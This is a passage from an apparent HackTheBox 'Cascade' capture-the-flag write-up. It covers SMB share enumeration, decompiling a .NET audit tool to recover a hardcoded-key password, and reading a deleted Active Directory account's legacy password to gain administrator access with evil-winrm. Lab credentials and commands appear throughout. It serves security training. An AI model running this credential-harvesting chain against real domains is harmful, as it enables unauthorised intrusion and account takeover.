`s.smith` is the only user in the group, but the comment is a useful hint to look at this share. There’s a `c:\shares\`, but I don’t have permissions to list the directories in it:

```bash
*Evil-WinRM* PS C:\> ls

    Directory: C:\

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----         1/9/2020   8:14 PM                inetpub
d-----        7/14/2009   4:20 AM                PerfLogs
d-r---        1/28/2020   7:27 PM                Program Files
d-r---         2/4/2021   4:24 PM                Program Files (x86)
d-----        1/15/2020   9:38 PM                Shares
d-r---        1/28/2020  11:37 PM                Users
d-----         2/4/2021   4:32 PM                Windows

*Evil-WinRM* PS C:\> cd Shares
*Evil-WinRM* PS C:\Shares> ls
Access to the path 'C:\Shares' is denied.
At line:1 char:1
+ ls
+ ~~
    + CategoryInfo          : PermissionDenied: (C:\Shares:String) [Get-ChildItem], UnauthorizedAccessException
    + FullyQualifiedErrorId : DirUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetChildItemCommand

```

However, I can just go into `Audit` based on the share name in the comment:

```bash
*Evil-WinRM* PS C:\Shares> cd audit
*Evil-WinRM* PS C:\Shares\audit> ls

    Directory: C:\Shares\audit

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        1/28/2020   9:40 PM                DB
d-----        1/26/2020  10:25 PM                x64
d-----        1/26/2020  10:25 PM                x86
-a----        1/28/2020   9:46 PM          13312 CascAudit.exe
-a----        1/29/2020   6:00 PM          12288 CascCrypto.dll
-a----        1/28/2020  11:29 PM             45 RunAudit.bat
-a----       10/27/2019   6:38 AM         363520 System.Data.SQLite.dll
-a----       10/27/2019   6:38 AM         186880 System.Data.SQLite.EF6.dll

```

I can also access this share from my local box:

```bash
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/Cascade]
└─$ crackmapexec smb 10.10.10.182 -u s.smith -p sT333ve2 --shares
SMB         10.10.10.182    445    CASC-DC1         [*] Windows 6.1 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False)
SMB         10.10.10.182    445    CASC-DC1         [+] cascade.local\s.smith:sT333ve2 
SMB         10.10.10.182    445    CASC-DC1         [+] Enumerated shares
SMB         10.10.10.182    445    CASC-DC1         Share           Permissions     Remark
SMB         10.10.10.182    445    CASC-DC1         -----           -----------     ------
SMB         10.10.10.182    445    CASC-DC1         ADMIN$                          Remote Admin
SMB         10.10.10.182    445    CASC-DC1         Audit$          READ            
SMB         10.10.10.182    445    CASC-DC1         C$                              Default share
SMB         10.10.10.182    445    CASC-DC1         Data            READ            
SMB         10.10.10.182    445    CASC-DC1         IPC$                            Remote IPC
SMB         10.10.10.182    445    CASC-DC1         NETLOGON        READ            Logon server share 
SMB         10.10.10.182    445    CASC-DC1         print$          READ            Printer Drivers
SMB         10.10.10.182    445    CASC-DC1         SYSVOL          READ            Logon server share
```

I’ll copy all the files to my local VM:

```bash
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/Cascade]
└─$ smbclient --user s.smith //10.10.10.182/Audit$ sT333ve2
Password for [WORKGROUP\s.smith]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Jan 29 18:01:26 2020
  ..                                  D        0  Wed Jan 29 18:01:26 2020
  CascAudit.exe                      An    13312  Tue Jan 28 21:46:51 2020
  CascCrypto.dll                     An    12288  Wed Jan 29 18:00:20 2020
  DB                                  D        0  Tue Jan 28 21:40:59 2020
  RunAudit.bat                        A       45  Tue Jan 28 23:29:47 2020
  System.Data.SQLite.dll              A   363520  Sun Oct 27 06:38:36 2019
  System.Data.SQLite.EF6.dll          A   186880  Sun Oct 27 06:38:38 2019
  x64                                 D        0  Sun Jan 26 22:25:27 2020
  x86                                 D        0  Sun Jan 26 22:25:27 2020

		6553343 blocks of size 4096. 1616777 blocks available

```

```bash
smb: \> prompt OFF
smb: \> recurse ON
smb: \> mget *
getting file \CascAudit.exe of size 13312 as CascAudit.exe (191.2 KiloBytes/sec) (average 191.2 KiloBytes/sec)
getting file \CascCrypto.dll of size 12288 as CascCrypto.dll (206.9 KiloBytes/sec) (average 198.4 KiloBytes/sec)
getting file \DB\Audit.db of size 24576 as Audit.db (461.5 KiloBytes/sec) (average 275.3 KiloBytes/sec)
getting file \RunAudit.bat of size 45 as RunAudit.bat (0.8 KiloBytes/sec) (average 213.2 KiloBytes/sec)
getting file \System.Data.SQLite.dll of size 363520 as System.Data.SQLite.dll (3317.8 KiloBytes/sec) (average 1198.9 KiloBytes/sec)
getting file \System.Data.SQLite.EF6.dll of size 186880 as System.Data.SQLite.EF6.dll (356.4 KiloBytes/sec) (average 690.9 KiloBytes/sec)
getting file \x64\SQLite.Interop.dll of size 1639936 as SQLite.Interop.dll (4411.8 KiloBytes/sec) (average 1805.3 KiloBytes/sec)
getting file \x86\SQLite.Interop.dll of size 1246720 as SQLite.Interop.dll (4629.3 KiloBytes/sec) (average 2308.8 KiloBytes/sec)

```

There was a `.NET` file. So, I was pretty sure that I had to work with `dnSpy` in order to debug the binary. So, I kept it for the end and moved on to enumerate other files

 The next thing the popped out to me was`DB\Audit.db`. It’s a SQLite3 database:

```bash
root@kali# sqlite3 Audit.db 
SQLite version 3.31.1 2020-01-27 19:55:54
Enter ".help" for usage hints.
sqlite> .tables
DeletedUserAudit  Ldap              Misc

sqlite> select * from DeletedUserAudit;
6|test|Test
DEL:ab073fb7-6d91-4fd1-b877-817b9e1b0e6d|CN=Test\0ADEL:ab073fb7-6d91-4fd1-b877-817b9e1b0e6d,CN=Deleted Objects,DC=cascade,DC=local
7|deleted|deleted guy
DEL:8cfe6d14-caba-4ec0-9d3e-28468d12deef|CN=deleted guy\0ADEL:8cfe6d14-caba-4ec0-9d3e-28468d12deef,CN=Deleted Objects,DC=cascade,DC=local
9|TempAdmin|TempAdmin
DEL:5ea231a1-5bb4-4917-b07a-75a57f4c188a|CN=TempAdmin\0ADEL:5ea231a1-5bb4-4917-b07a-75a57f4c188a,CN=Deleted Objects,DC=cascade,DC=local

sqlite> select * from Ldap;
1|ArkSvc|BQO5l5Kj9MdErXx6Q6AGOw==|cascade.local

sqlite> select * from Misc;

```

Nothing jumped out as particularly interesting. I thought the `Ldap` table could have had a password in it, but the base64-encoded data didn’t decode to ASCII. Perhaps it’s encrypted somehow.

Moving on to `RunAudit.bat`. It shows that `CascAudit.exe` is run with the db file as an argument:

```bash
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/Cascade]
└─$ cat RunAudit.bat 
CascAudit.exe "\\CASC-DC1\Audit$\DB\Audit.db"
```

So now, I’ll switch over to my Windows machine and use DNSpy to take a look. 

![casc-2](https://github.com/darshannn10/HackTheBox/assets/87711310/7e8775b5-b6b2-43ee-b40d-5cd9de95abe9)

Looking at the `MainModule` of the `CascAudit.exe`, there’s this code:

```csharp
namespace CascAudiot
{
  // Token: 0x02000008 RID: 8
  [StandardModule]
  internal sealed class MainModule
  {
    // Token: 0x0600000F RID: 15 RVA: 0x00002128 File Offset: 0x00000328
    [STAThread]
    public static void Main()
    {
      if (MyProject.Application.CommandLineArgs.Count != 1)
      {
        Console.WriteLine("Invalid number of command line args specified. Must specify database path only");
        return;
      }
      checked
      {
        using (SQLiteConnection sqliteConnection = new SQLiteConnection("Data Source=" + MyProject.Application.CommandLineArgs[0] + ";Version=3;"))
        {
          string str = string.Empty;
          string password = string.Empty;
          string str2 = string.Empty;
          try
          {
            sqliteConnection.Open();
            using (SQLiteCommand sqliteCommand = new SQLiteCommand("SELECT * FROM LDAP", sqliteConnection))
            {
              using (SQLiteDataReader sqliteDataReader = sqliteCommand.ExecuteReader())
              {
                sqliteDataReader.Read();
                str = Conversions.ToString(sqliteDataReader["Uname"]);
                str2 = Conversions.ToString(sqliteDataReader["Domain"]);
                string encryptedString = Conversions.ToString(sqliteDataReader["Pwd"]);
                try
                {
                  password = Crypto.DecryptString(encryptedString, "c4scadek3y654321");
                }
                catch (Exception ex)
                {
                  Console.WriteLine("Error decrypting password: " + ex.Message);
                  return;
                }
              }
            }
            sqliteConnection.Close();
          }
          catch (Exception ex2)
          {
            Console.WriteLine("Error getting LDAP connection data From database: " + ex2.Message);
            return;
          }
...[snip]...

```

The `CascAudiot` function is opening an SQLite connection to the database passed as an arg, reading from the LDAP table, and decrypting the password.

I decided to recover the plaintext password by debugging. I put a breakpoint on line 44 where the password decrytption process in done. Then I went Debug -> Start Debugging…, and set the Arugument to where I had a copy of `Audit.db`:

![casc-3](https://github.com/darshannn10/HackTheBox/assets/87711310/475d6eaa-333e-4817-a31b-a9c8f46f6e49)

On hitting OK, it runs to the breakpoint, and I can see the decrypted password in the Locals window:

![casc-4](https://github.com/darshannn10/HackTheBox/assets/87711310/7b640d11-d150-4a35-b6f8-f0291badb162)

Based on the line in the SQLite DB, this password, `w3lc0meFr31nd`, likely pairs with the account arksvc.

```bash
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/Cascade]
└─$ crackmapexec winrm 10.10.10.182 -u arksvc -p w3lc0meFr31nd
WINRM       10.10.10.182    5985   CASC-DC1         [*] http://10.10.10.182:5985/wsman
WINRM       10.10.10.182    5985   CASC-DC1         [+] CASCADE\arksvc:w3lc0meFr31nd (Pwn3d!)
```

Getting a shell as user `arksvc`:

![casc-5](https://github.com/darshannn10/HackTheBox/assets/87711310/6a6b45eb-6811-4f52-b92a-9200e41f5d3c)

Enumerating the user `arksvc`: 

```bash
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/Cascade]
└─$ *Evil-WinRM* PS C:\> net user arksvc
User name                    arksvc
Full Name                    ArkSvc
Comment
User's comment
Country code                 000 (System Default)
Account active               Yes
Account expires              Never

Password last set            1/9/2020 5:18:20 PM
Password expires             Never
Password changeable          1/9/2020 5:18:20 PM
Password required            Yes
User may change password     No

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   3/30/2020 12:37:25 PM

Logon hours allowed          All

Local Group Memberships      *AD Recycle Bin       *IT
                             *Remote Management Use
Global Group memberships     *Domain Users
The command completed successfully.
```

The user belongs to the `AD Recycle Bin` group. `AD Recycle Bin` is a well-know Windows group. [Active Directory Object Recovery (or Recycle Bin)](https://blog.stealthbits.com/active-directory-object-recovery-recycle-bin/) is a feature added in Server 2008 to allow administrators to recover deleted items just like the recycle bin does for files. The linked article gives a PowerShell command to query all of the deleted objects within a domain:

```bash
*Evil-WinRM* PS C:\Users\arksvc\Documents> Get-ADObject -SearchBase "CN=Deleted Objects, DC=Cascade, DC=Local" -Filter {ObjectClass -eq "user"} -IncludeDeletedObjects -Properties *

accountExpires                  : 9223372036854775807
badPasswordTime                 : 0
badPwdCount                     : 0
CanonicalName                   : cascade.local/Deleted Objects/CASC-WS1
                                  DEL:6d97daa4-2e82-4946-a11e-f91fa18bfabe
CN                              : CASC-WS1
                                  DEL:6d97daa4-2e82-4946-a11e-f91fa18bfabe
codePage                        : 0
countryCode                     : 0
Created                         : 1/9/2020 7:30:19 PM
createTimeStamp                 : 1/9/2020 7:30:19 PM
Deleted                         : True
Description                     :
DisplayName                     :
DistinguishedName               : CN=CASC-WS1\0ADEL:6d97daa4-2e82-4946-a11e-f91fa18bfabe,CN=Deleted Objects,DC=cascade,DC=local
dSCorePropagationData           : {1/17/2020 3:37:36 AM, 1/17/2020 12:14:04 AM, 1/9/2020 7:30:19 PM, 1/1/1601 12:04:17 AM}
instanceType                    : 4
isCriticalSystemObject          : False
isDeleted                       : True
LastKnownParent                 : OU=Computers,OU=UK,DC=cascade,DC=local
lastLogoff                      : 0
lastLogon                       : 0
localPolicyFlags                : 0
logonCount                      : 0
Modified                        : 1/28/2020 6:08:35 PM
modifyTimeStamp                 : 1/28/2020 6:08:35 PM
msDS-LastKnownRDN               : CASC-WS1
Name                            : CASC-WS1
                                  DEL:6d97daa4-2e82-4946-a11e-f91fa18bfabe
nTSecurityDescriptor            : System.DirectoryServices.ActiveDirectorySecurity
ObjectCategory                  :
ObjectClass                     : computer
ObjectGUID                      : 6d97daa4-2e82-4946-a11e-f91fa18bfabe
objectSid                       : S-1-5-21-3332504370-1206983947-1165150453-1108
primaryGroupID                  : 515
ProtectedFromAccidentalDeletion : False
pwdLastSet                      : 132230718192147073
sAMAccountName                  : CASC-WS1$
sDRightsEffective               : 0
userAccountControl              : 4128
uSNChanged                      : 245849
uSNCreated                      : 24603
whenChanged                     : 1/28/2020 6:08:35 PM
whenCreated                     : 1/9/2020 7:30:19 PM

accountExpires                  : 9223372036854775807
badPasswordTime                 : 0
badPwdCount                     : 0
CanonicalName                   : cascade.local/Deleted Objects/TempAdmin
                                  DEL:f0cc344d-31e0-4866-bceb-a842791ca059
cascadeLegacyPwd                : YmFDVDNyMWFOMDBkbGVz
CN                              : TempAdmin
                                  DEL:f0cc344d-31e0-4866-bceb-a842791ca059
codePage                        : 0
countryCode                     : 0
Created                         : 1/27/2020 3:23:08 AM
createTimeStamp                 : 1/27/2020 3:23:08 AM
Deleted                         : True
Description                     :
DisplayName                     : TempAdmin
DistinguishedName               : CN=TempAdmin\0ADEL:f0cc344d-31e0-4866-bceb-a842791ca059,CN=Deleted Objects,DC=cascade,DC=local
dSCorePropagationData           : {1/27/2020 3:23:08 AM, 1/1/1601 12:00:00 AM}
givenName                       : TempAdmin
instanceType                    : 4
isDeleted                       : True
LastKnownParent                 : OU=Users,OU=UK,DC=cascade,DC=local
lastLogoff                      : 0
lastLogon                       : 0
logonCount                      : 0
Modified                        : 1/27/2020 3:24:34 AM
modifyTimeStamp                 : 1/27/2020 3:24:34 AM
msDS-LastKnownRDN               : TempAdmin
Name                            : TempAdmin
                                  DEL:f0cc344d-31e0-4866-bceb-a842791ca059
nTSecurityDescriptor            : System.DirectoryServices.ActiveDirectorySecurity
ObjectCategory                  :
ObjectClass                     : user
ObjectGUID                      : f0cc344d-31e0-4866-bceb-a842791ca059
objectSid                       : S-1-5-21-3332504370-1206983947-1165150453-1136
primaryGroupID                  : 513
ProtectedFromAccidentalDeletion : False
pwdLastSet                      : 132245689883479503
sAMAccountName                  : TempAdmin
sDRightsEffective               : 0
userAccountControl              : 66048
userPrincipalName               : TempAdmin@cascade.local
uSNChanged                      : 237705
uSNCreated                      : 237695
whenChanged                     : 1/27/2020 3:24:34 AM
whenCreated                     : 1/27/2020 3:23:08 AM

```

The last one is really interesting, because it’s the temporary administrator account mentioned in the old email I found earlier (which also said it was using the same password as the normal admin account).

Immediately `cascadeLegacyPwd : YmFDVDNyMWFOMDBkbGVz` jumps out. It decodes to `baCT3r1aN00dles`:

```bash
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/Cascade]
└─$ echo YmFDVDNyMWFOMDBkbGVz | base64 -d
baCT3r1aN00dles
```

Checking out whether this password works for the new administrator account as well:

```bash
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/Cascade]
└─$ crackmapexec winrm 10.10.10.182 -u administrator -p baCT3r1aN00dles
WINRM       10.10.10.182    5985   CASC-DC1         [*] http://10.10.10.182:5985/wsman
WINRM       10.10.10.182    5985   CASC-DC1         [+] CASCADE\administrator:baCT3r1aN00dles (Pwn3d!)

```

And it does!!!

Logging in as an administrator:

```bash
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/Cascade]
└─$ evil-winrm -u administrator -p baCT3r1aN00dles -i 10.10.10.182

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
cascade\administrator

```

Root Flag:

```bash
*Evil-WinRM* PS C:\Users\Administrator\desktop> cat root.txt
...SNIP...
```
